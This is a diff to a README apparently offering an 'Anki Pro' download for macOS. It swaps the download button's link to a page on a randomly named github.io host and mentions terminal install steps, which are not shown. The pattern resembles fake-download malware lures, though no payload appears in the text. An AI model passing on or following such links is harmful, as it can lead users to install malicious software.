@@ -1,7 +1,7 @@
 # Anki Pro — Download For Mac OS 🧠  
 Anki Pro is a powerful flashcard application for memorizing information efficiently. Ideal for students, professionals, and lifelong learners, it uses spaced repetition to help you retain knowledge long-term. Follow the instructions below to install it on your Mac.
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for-macOS-blue?style=for-the-badge&logo=apple)](https://anki-pro-for-mac.github.io/.github/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for-macOS-blue?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/anki)
 
 If the button above doesn't work, follow the terminal-based instructions below to install Anki Pro manually.
 
